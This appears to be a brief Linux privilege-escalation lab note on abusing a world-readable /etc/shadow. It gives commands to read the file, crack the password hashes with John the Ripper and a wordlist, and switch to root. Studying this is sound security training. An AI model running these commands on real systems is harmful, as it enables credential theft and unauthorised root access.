# Weak File Permissions - Readable /etc/shadow

`ls -l /etc/shadow`

View the contents of the /etc/shadow file:

`cat /etc/shadow`

A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

Switch to the root user, using the cracked password:

`su root`
